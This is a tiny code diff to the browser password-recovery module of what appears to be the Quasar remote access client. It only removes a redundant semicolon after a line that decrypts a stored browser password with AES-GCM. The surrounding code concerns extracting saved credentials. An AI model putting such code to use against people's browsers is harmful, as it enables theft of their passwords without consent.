@@ -55,7 +55,7 @@ namespace Quasar.Client.Recovery.Browsers
 
                 var decryptedPassword = DecryptAesGcm(encryptedPassword, _key, initialisationVector);
 
-                return Encoding.UTF8.GetString(decryptedPassword); ;
+                return Encoding.UTF8.GetString(decryptedPassword);
             }
             catch (Exception e)
             {
